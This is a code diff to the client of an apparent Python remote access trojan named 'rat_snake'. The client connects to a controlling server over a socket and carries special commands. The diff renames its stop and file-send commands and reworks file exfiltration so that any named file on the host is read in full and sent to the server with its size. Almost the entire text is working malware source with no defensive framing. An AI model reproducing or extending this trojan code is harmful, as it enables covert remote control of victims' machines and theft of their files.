@@ -7,6 +7,7 @@
 import socket
 import os
 import subprocess
+import re
 
 HOST = "127.0.0.1"  # The server's hostname or IP address
 PORT = 1234  # The port used by the server
@@ -23,29 +24,25 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         # special commands
         if command_to_run[:9] == "rat_snake":
             # stop client
-            if command_to_run[10:21] == "stop_client":
+            if command_to_run[10:] == "quit":
                 response = "special:client_stopped"
                 s.sendall(response.encode(ENCODING))
                 exit()
             # send file
-            #rat_snake send_file
-            if command_to_run[10:19] == "send_file":
-                print("file send command detected")
-                filename = command_to_run [20:]
+            # rat_snake download
+            if command_to_run[10:18] == "download":
+                filename = command_to_run[19:]
+                # strip all spaces
                 if os.path.exists(filename):
-                    #prep server for recieving
-                    s.sendall(f"special:recieve_file {filename}".encode(ENCODING))
-                    print("prepped server for recieving")
-                    #open file and send in 1024 byte increments
+                    # prep server for recieving
+                    file_size = os.path.getsize(filename)
+                    # server needs no spaces in filename
+                    server_filename = re.sub(" ", "-", filename)
+                    s.sendall(f"special:recieve_file {server_filename} {file_size}".encode(ENCODING))
+                    # open file and send
                     with open(filename, "rb") as file:
-                        print("opened file")
-                        buffer = file.read(1024)
-                        print("got initial buffer")
-                        while buffer:
-                            s.send(buffer)
-                            print("sent buffer to server")
-                            buffer = file.read(1024)
-                            print("read file to buffer")
+                        buffer = file.read(file_size)
+                        s.sendall(buffer)
                     response = "file transfer complete."
                 else:
                     response = "file does not exist."
